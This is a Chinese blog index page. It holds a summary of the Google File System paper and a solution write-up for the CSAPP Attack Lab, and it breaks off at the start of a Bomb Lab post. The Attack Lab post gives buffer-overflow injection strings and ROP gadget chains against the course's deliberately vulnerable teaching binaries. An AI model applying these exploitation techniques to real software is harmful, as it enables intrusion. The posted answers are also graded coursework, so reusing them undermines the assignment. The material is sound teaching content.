<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Iggie Wang&#039;s Cyberspace</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Iggie Wang&#039;s Cyberspace"><meta name="msapplication-TileImage" content="/img/dog.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Iggie Wang&#039;s Cyberspace"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Iggie Wang&#039;s Cyberspace"><meta property="og:url" content="https://www.iggiewang.cn/"><meta property="og:site_name" content="Iggie Wang&#039;s Cyberspace"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.iggiewang.cn/img/og_image.png"><meta property="article:author" content="王亮"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.iggiewang.cn"},"headline":"Iggie Wang's Cyberspace","image":["https://www.iggiewang.cn/img/og_image.png"],"author":{"@type":"Person","name":"王亮"},"publisher":{"@type":"Organization","name":"Iggie Wang's Cyberspace","logo":{"@type":"ImageObject","url":null}},"description":""}</script><link rel="icon" href="/img/dog.jpg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.15.2/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Iggie Wang&#039;s Cyberspace</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/2021/01/16/About-me">About</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-30T07:26:08.000Z" title="2021/1/30 下午3:26:08">2021-01-30</time>发表</span><span class="level-item">12 分钟读完 (大约1868个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/30/Google-File-System/">Google File System</a></h1><div class="content"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>GFS 是 Google 针对大数据处理场景设计的分布式文件系统，Google 对数据量的持续增长的设想如下：</p>
<ul>
<li>需要能够运行在经常故障的物理机环境上。只有做到这点，这个系统才能运行在几百到上千台规模下，并采用相对便宜的服务器硬件</li>
<li>大文件居多。存储在 GFS 上的文件的不少都在几个 GB 这样的级别</li>
<li>大多数写是append写，即在文件末尾追加</li>
<li>性能主要考量是吞吐而不是延时</li>
</ul>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>GFS 以目录树的形式组织文件，但是并没有提供类似 POSIX 标准的文件系统操作。操作只要包含 create, open, write, read, close, delete, append, snapshot，其中 snapshot 用于快速复制一个文件或者目录，允许多个客户端并行追加数据到一个文件。</p>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>整体架构上，GFS 由单一的 master 节点、chunkserver 和提供给用户的 client 三大部分组成：</p>
<img src="/2021/01/30/Google-File-System/gfs.png" style="zoom:100%;">

<p>client 与 chunkserver 都不会缓存文件数据，为的是防止数据出现不一致的状况，但是 client 会缓存 metadata 的信息。</p>
<h3 id="master"><a href="#master" class="headerlink" title="master"></a>master</h3><p>一方面存储所有的 metadata，负责管理所有的元信息，包括表示文件系统目录结构的 namespace、访问控制信息、文件与 chunk 的映射关系、chunk 的位置信息；另一方面管理 chunk 租约、chunk 迁移(如果 chunkserver 挂掉)、维护与 chunkserver 之间的心跳。</p>
<ul>
<li>namespace 采用全内存的数据结构，以提高访问的吞吐</li>
<li>namespace 是一个查找表(lookup table)，并且采用了前缀压缩的方式存储在内存中，它是一个树结构，树中每一个节点(文件名或目录名)都有一个读/写锁。在对文件或目录操作的时候需要获取锁，例如修改 <code>/root/foo/bar</code>，需要获得 <code>/root</code>、<code>/root/foo</code> 的读锁，<code>/root/foo/bar</code> 的写锁</li>
<li>master 本身并不记录 chunk 的位置，而是在启动的时候，通过收取 chunkserver 的信息来构建。这种设计避免了 master 和 chunkserver 的信息不一致的问题(因为以 chunkserver 为准)</li>
<li>master 和 chunkserver 通过定期心跳来保持信息同步、感知 chunkserver 故障等</li>
<li>master 往磁盘上写操作日志，并将这些日志同步到其他物理机保存的方式来确保数据安全性。当前 master 机器故障的时候，可以通过这些日志和 chunkserver 的心跳内容，可以恢复到故障前的状态</li>
<li>对于操作日志，会定期在系统后台执行 checkpoint；checkpoint 构建成一个类似B+树、可以快速的 load 到内存中直接使用的结构</li>
<li>master 需要定期检查每个 chunk 的副本情况，如果副本低于配置值，就需要将通知 chunkserver 进行复制；如果存在一些多余的 chunk (file 已经被删除了)，就需要做一些清理工作</li>
</ul>
<h3 id="chunkserver"><a href="#chunkserver" class="headerlink" title="chunkserver"></a>chunkserver</h3><p>每个 chunk 有一个 64 位标识符(chunk handle)，它是在 chunk 被创建时由 master 分配的，每一个 chunk 会有多个副本，分别在不同的机器上，每个副本会以 Linux 文件的形式存储在 chunkserver 的本地磁盘上。<br>GFS 中将 chunk 的大小定为 64 MB，它比一般的文件系统的块大小要大。优点：减少 metadata 的数量、减少 client 与 master 的交互、client 可以在一个 chunk 上执行更多的操作，通过 TCP 长连接减少网络压力；缺点：如果在一个 chunk 上有一个可执行文件，同时有许多 client 都要请求执行这个文件，它的压力会很大。<br>chunk 的位置信息在 master 中不是一成不变的，master 会通过定期的 heartbeat 进行更新，这样做能够减小开销，这样做就不用 master 与 chunkserver 时刻保持同步通信(包括 chunkserver 的加入、退出、改名、宕机、重启等)。chunkserver 上有一个 final word，它表示了哪个 chunk 在它的磁盘上，哪个 chunk 不在。</p>
<h2 id="一致性模型"><a href="#一致性模型" class="headerlink" title="一致性模型"></a>一致性模型</h2><img src="/2021/01/30/Google-File-System/consistency.png" style="zoom:100%;">

<blockquote>
<p>defined：状态已定义，从客户端角度来看，客户端完全了解已写入集群的数据<br>consistent：客户端来看chunk多副本的数据完全一致，但不一定defined</p>
</blockquote>
<ul>
<li>串行写：客户端自己知道写入文件范围以及写入数据内容，且本次写入在数据服务器的多副本上均执行成功，每个客户端的写操作串行执行，因此最终结果是 <code>defined</code></li>
<li>并行写：每次写入在数据服务器的多副本上均执行成功，所以结果是 <code>consistent</code>，但客户端无法得知写操作的执行顺序，即使每次操作都成功，客户端无法确定在并发写入时交叉部分，所以是 <code>undefined</code></li>
<li>追加写：客户端能够根据 offset 确切知道写入结果，无论是串行追加还是并发追加，其行为是 <code>defined</code>，追加时至少保证一次副本写成功，如果存在追加失败，则多个副本之间某个范围的数据可能不一致，因此是 <code>interspersed with inconsistent</code>。</li>
</ul>
<h2 id="GFS-租约"><a href="#GFS-租约" class="headerlink" title="GFS 租约"></a>GFS 租约</h2><p>GFS 使用租约机制 (lease) 来保障 mutation (指的是改变了 chunk 的内容或者 metadata，每一次 mutation 都应该作用于所有的备份) 的一致性：多个备份中的一个持有 lease，这个备份被称为 primary replica (其余的备份为 secondary replicas)，GFS 会把所有的 mutation 都序列化(串行化)，让 primary 执行，secondary 也按相同顺序执行，primary 是由 master 选出来的，一个 lease 通常 60 秒会超时。</p>
<h2 id="写流程"><a href="#写流程" class="headerlink" title="写流程"></a>写流程</h2><img src="/2021/01/30/Google-File-System/write.png" style="zoom:100%;">

<ol>
<li>client 向 master 请求持有 lease 的 chunk (primary replica) 位置和其他 replicas 的位置(如果没有 chunk 持有 lease，那么 master 会授予其中一个 replica 一个 lease)</li>
<li>master 返回 primary 的信息和其他 replicas 的位置，然后 client 将这些信息缓存起来(只有当 primary 无法通信或者该 primary replica 没有 lease 了，client 才会向 master 再次请求)</li>
<li>client 会将数据发送到所有的 replicas，每个 chunkserver 会把数据存在 LRU 缓存中</li>
<li>在所有的 replicas 都收到了数据之后，client 会向 primary 发送写请求。primary 会给它所收到的所有 mutation 分配序列号(这些 mutation 有可能不是来自于同一个 client)，它会在自己的机器上按序列号进行操作</li>
<li>primary 给 secondaries 发送写请求，secondaries 会按相同的序列执行操作</li>
<li>secondaries 告知 primary 操作执行完毕</li>
<li>primary 向 client 应答，期间的错误也会发送给 client，client 错误处理程序 (error handler) 会重试失败的 mutation</li>
</ol>
<h2 id="读流程"><a href="#读流程" class="headerlink" title="读流程"></a>读流程</h2><ol>
<li><p>client 向 master 发出 A 文件的读请求</p>
</li>
<li><p>master 收到后返回 A 文件的 chunk handler 和 chunk 的位置</p>
</li>
<li><p>client 携带 chunk handle 以及位偏移向对应的 chunkserver 发出请求</p>
</li>
<li><p>chunkserver 读取并返回数据至 client</p>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Ghemawat, Sanjay, Howard Gobioff, and Shun-Tak Leung. “The Google file system.” (2003).</li>
</ol>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-21T07:00:00.000Z" title="2021/1/21 下午3:00:00">2021-01-21</time>发表</span><span class="level-item">10 分钟读完 (大约1528个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/21/Attack-Lab/">Attack Lab</a></h1><div class="content"><p><code>本文记录 CSAPP 的 Attack Lab 完成方案。</code></p>
<h2 id="1-ctarget-部分"><a href="#1-ctarget-部分" class="headerlink" title="1. ctarget 部分"></a>1. ctarget 部分</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><code>level 1</code> 要求我们在 <code>getbuf</code> 输入字符串后，利用溢出来重写栈中 <code>getbuf</code> 函数返回的地址，让函数调用 <code>touch1</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401713 &lt;getbuf&gt;:</span><br><span class="line">  401713:	48 83 ec 38          	sub    $0x38,%rsp</span><br><span class="line">  401717:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  40171a:	e8 3b 02 00 00       	callq  40195a &lt;Gets&gt;</span><br><span class="line">  40171f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401724:	48 83 c4 38          	add    $0x38,%rsp</span><br><span class="line">  401728:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>根据这段汇编代码我们可以确定，<code>getbuf</code> 在栈中分配了0x38比特的内存来存储输入的字符串。如果我们输入的字符串长度超过 56，就可以覆盖掉 <code>getbuf</code> 的返回地址了，所以，我们只需要把输入的第 56-63 个字符填写为 <code>touch1</code> 函数的地址就行了。<br>需要注意的是，我们输入的字符应该用两位十六进制数来表示，然后通过 <code>hex2raw</code> 来将其转换成字符串。另外，我这里数据都是用小端法来保存的，所以低位在前：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">29 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p><code>level 2</code> 要求我们注入我们自己写的代码，并把程序转移到我们写的代码处运行，也就是执行 <code>touch2</code>。<br>如何通过我们的代码跳转到 <code>touch2</code> 函数？<br>首先，我们需要找到缓冲区的起始地址，在 <code>getbuf</code> 处打断点，查看 <code>$rsp</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p $rsp</span><br><span class="line">$1 &#x3D; (void *) 0x5565fd40</span><br></pre></td></tr></table></figure>
<p>可以知道，<code>0x5565fd40 - 0x38 = 0x5565fd08</code> 就是缓冲区的起始地址，我们需要和前面的 <code>level 1</code> 一样，让缓冲区溢出，56-63 个字符填写为缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码，这样程序才能执行我们想要的结果。<br>我们注入的代码逻辑应该是：</p>
<ul>
<li>将 <code>cookie</code> 值赋给 <code>%edi</code> 作为 <code>touch2</code> 函数的参数</li>
<li>将 <code>touch2</code> 函数的地址入栈</li>
<li>ret，让函数执行 <code>touch2</code></li>
</ul>
<p>转为汇编就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x2a2e4a08, %edi</span><br><span class="line">pushq $0x0000000000401755</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>这里需要用到 <code>gcc</code> 内联汇编的方法，编写 <code>level2.c</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	asm</span><br><span class="line">	(</span><br><span class="line">	 &quot;movl $0x2a2e4a08, %edi\n\t&quot;</span><br><span class="line">	 &quot;pushq $0x0000000000401755\n\t&quot;</span><br><span class="line">	 &quot;ret&quot;</span><br><span class="line">	);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译并查看其反汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc level2.c -o level2.out</span><br><span class="line">objdump -d level2.out </span><br></pre></td></tr></table></figure>
<p>可以看到我们想要的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4004f1:       bf 08 4a 2e 2a          mov    $0x2a2e4a08,%edi</span><br><span class="line">4004f6:       68 55 17 40 00          pushq  $0x401755</span><br><span class="line">4004fb:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>那么我们在缓冲区注入字符就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bf 08 4a 2e 2a 68 55 17 </span><br><span class="line">40 00 c3 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">08 fd 65 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><code>level 3</code> 要求我们执行 <code>touch3</code>，<code>touch3</code> 接收的参数是 <code>cookie</code> 的字符串的地址。<br>有了 <code>level 2</code> 的经验，我们知道需要在 56-63 个字符填写缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码。我们把 <code>cookie</code> 字符串放在第 64-71 个字符，这样，我们注入的代码就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5565fd48, %edi</span><br><span class="line">pushq $0x0000000000401829</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p><code>0x5565fd08 + 64 = 0x5565fd48</code> 是 <code>cookie</code> 字符串的地址，<code>0x0000000000401829</code> 是 <code>touch3</code> 函数地址。同样地，用 <code>gcc</code> 内联汇编的方法得到汇编代码，最终我们在缓冲区注入字符就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bf 48 fd 65 55 68 29 18 </span><br><span class="line">40 00 c3 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">08 fd 65 55 00 00 00 00</span><br><span class="line">32 61 32 65 34 61 30 38</span><br></pre></td></tr></table></figure>

<h2 id="2-rtarget-部分"><a href="#2-rtarget-部分" class="headerlink" title="2. rtarget 部分"></a>2. rtarget 部分</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>与之前的 <code>level 2</code> 相同，我们需要为 <code>%rdi</code> 赋上 <code>cookie</code> 值，再跳转到 <code>touch2</code> 函数执行，跳转到 <code>touch2</code> 只需要将 <code>touch2</code> 的入口地址放在最后一个 <code>gadget</code> 之后，在它的 <code>ret</code> 指令执行之后就会返回到 <code>touch2</code> 中。<br>查看 <code>farm.s</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000000000000001b &lt;getval_188&gt;:</span><br><span class="line">  1b:	b8 3c cd 58 c3       	mov    $0xc358cd3c,%eax</span><br><span class="line">  20:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p><code>58 c3</code> 对应 <code>popq %rax</code>，这条指令的地址是 <code>0x1b + 3 = 0x1e</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000028 &lt;setval_279&gt;:</span><br><span class="line">  28:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)</span><br><span class="line">  2e:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>48 89 c7 c3</code> 对应 <code>movq %rax,%rdi</code>，这条指令的地址是 <code>0x28 + 2 = 0x30</code>。<br>再查看 <code>rtarget.s</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004018b1 &lt;start_farm&gt;:</span><br><span class="line">  4018b1:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4018b6:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>start_farm</code> 的起始地址是 <code>0x4018b1</code>。所以 <code>popq %rax</code> 这条指令最终的地址是 <code>0x1e + 0x4018b1 = 0x4018cf</code>；所以 <code>movq %rax,%rdi</code> 这条指令最终的地址是 <code>0x30 + 0x4018b1 = 0x4018e1</code>。<br><code>level 2(rtarget)</code> 最终结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">cf 18 40 00 00 00 00 00 &#x2F;* popq %rax *&#x2F;</span><br><span class="line">08 4a 2e 2a 00 00 00 00 &#x2F;* 将 cookie 存入 %rax *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi *&#x2F;</span><br><span class="line">55 17 40 00 00 00 00 00 &#x2F;* 返回到 touch2 *&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>与之前的 <code>level 3</code> 相同，需要将 <code>%rdi</code> 指向 <code>cookie</code> 的字符串表示的首地址。我们需要把 <code>cookie</code> 字符串放在高地址，根据 <code>%rsp</code> 和偏移量去取地址。<br>在 <code>farm.s</code> 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000042 &lt;add_xy&gt;:</span><br><span class="line">  42:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  46:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>lea (%rdi,%rsi,1) %rax</code> 就是 <code>%rax = %rdi + %rsi</code>，所以，只要能够让 <code>%rdi</code> 和 <code>%rsi</code> 其中一个保存 <code>%rsp</code>，另一个保存偏移量，就可以计算出 <code>cookie</code> 存放的地址，然后 <code>movq %rax,%rdi</code> 再调用 <code>touch3</code> 就可以了。<br>所以，分两步走：先保存一个栈顶地址，这里我通过 <code>%rsp -&gt; %rax -&gt; %rdi</code> 保存到 <code>%rdi</code> 中，再将偏移量通过 <code>%eax(%rax) -&gt; %ecx -&gt; %edx -&gt; %esi</code> 保存到 <code>%esi(%rsi)</code> 中。注意，偏移量的值需要等所有指令写完后才能确定。<br><code>level 3(rtarget)</code> 最终结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">1e 19 40 00 00 00 00 00 &#x2F;* movq %rsp,%rax (48 89 e0) *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi (48 89 c7) *&#x2F;</span><br><span class="line">cf 18 40 00 00 00 00 00 &#x2F;* popq %rax (58) *&#x2F;</span><br><span class="line">&#x2F;* %rdi中保存的是 movq %rsp,%rax 这条指令的栈顶地址，所以最终偏移量为 0x48 *&#x2F;</span><br><span class="line">48 00 00 00 00 00 00 00 &#x2F;* 偏移量 *&#x2F;</span><br><span class="line">58 19 40 00 00 00 00 00 &#x2F;* movl %eax,%ecx (89 c1) *&#x2F;</span><br><span class="line">7a 19 40 00 00 00 00 00 &#x2F;* movl %ecx,%edx (89 ca) *&#x2F;</span><br><span class="line">0c 19 40 00 00 00 00 00 &#x2F;* movl %edx,%esi (89 d6) *&#x2F;</span><br><span class="line">f3 18 40 00 00 00 00 00 &#x2F;* add_xy *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi (48 89 c7) *&#x2F;</span><br><span class="line">29 18 40 00 00 00 00 00 &#x2F;* touch3地址 *&#x2F;</span><br><span class="line">32 61 32 65 34 61 30 38 &#x2F;* 目标字符串 *&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l1 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l2 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch2!: You called touch2(0x2a2e4a08)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l3 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-rtarget.l1 | .&#x2F;rtarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch2!: You called touch2(0x2a2e4a08)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-rtarget.l2 | .&#x2F;rtarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
<h2 id="repo"><a href="#repo" class="headerlink" title="repo"></a>repo</h2><p><a target="_blank" rel="noopener" href="https://github.com/hey-kong/csapp">My solutions to CSAPP labs</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-21T00:00:00.000Z" title="2021/1/21 上午8:00:00">2021-01-21</time>发表</span><span class="level-item">16 分钟读完 (大约2468个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/21/Bomb-Lab/">Bomb Lab</a></h1><div class="content"><p><code>本文记录 CSAPP 的 Bomb Lab 完成方案。</code></p>
<h2 id="bomb-1"><a href="#bomb-1" class="headerlink" title="bomb 1"></a>bomb 1</h2><p>在 <code>phase_1</code> 中， 调用 <code>strings_not_equal</code> 函数：</p>
